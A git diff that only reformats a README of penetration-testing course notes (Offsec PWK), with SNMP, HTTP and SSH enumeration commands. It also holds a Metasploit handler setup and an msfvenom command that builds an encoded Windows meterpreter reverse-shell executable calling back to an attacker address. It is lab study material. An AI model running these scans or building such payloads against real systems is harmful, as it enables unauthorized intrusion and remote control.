@@ -44,23 +44,23 @@ Offsec PWK notes and frecuently used files.
 
 <h4> SNMP</h4>
 
-  snmpcheck -t 1.1.1.1 >> ENUM-SNMP.txt
+    snmpcheck -t 1.1.1.1 >> ENUM-SNMP.txt
 
-  snmpwalk -c public 1.1.1.1  -v 2c
+    snmpwalk -c public 1.1.1.1  -v 2c
 
-  onesixtyone -c public.txt -o snmp-onesixtyone.txt -dd 1.1.1.1 
+    onesixtyone -c public.txt -o snmp-onesixtyone.txt -dd 1.1.1.1 
 
 <h4> HTTP</h4>
 
-  nikto -o nikto.html -Display V -nolookup -host 1.1.1.1  && firefox nikto.html
+    nikto -o nikto.html -Display V -nolookup -host 1.1.1.1  && firefox nikto.html
 
-  dirb http://1.1.1.1 /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -l -o dirb.txt
+    dirb http://1.1.1.1 /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -l -o dirb.txt
 
-  Dirbuster: Change to 50 req/s, no recursion, export simple list. 
+    Dirbuster: Change to 50 req/s, no recursion, export simple list. 
 
 <h4> SSH </h4>
 
-msf > use auxiliary/scanner/ssh/ssh_enumusers
+    msf > use auxiliary/scanner/ssh/ssh_enumusers
 
 <div id="Exploitation"> <h3>2. Exploitation</h3></div>
 
@@ -73,6 +73,8 @@ msf > use auxiliary/scanner/ssh/ssh_enumusers
     set LHOST 10.10.10.10
     set LPORT 443
     run
+
+<br>
 
     msfvenom -p windows/meterpreter_reverse_tcp -f exe -o metp.exe -e x86/shikata_ga_nai LHOST=10.10.10.10 LPORT=443
 
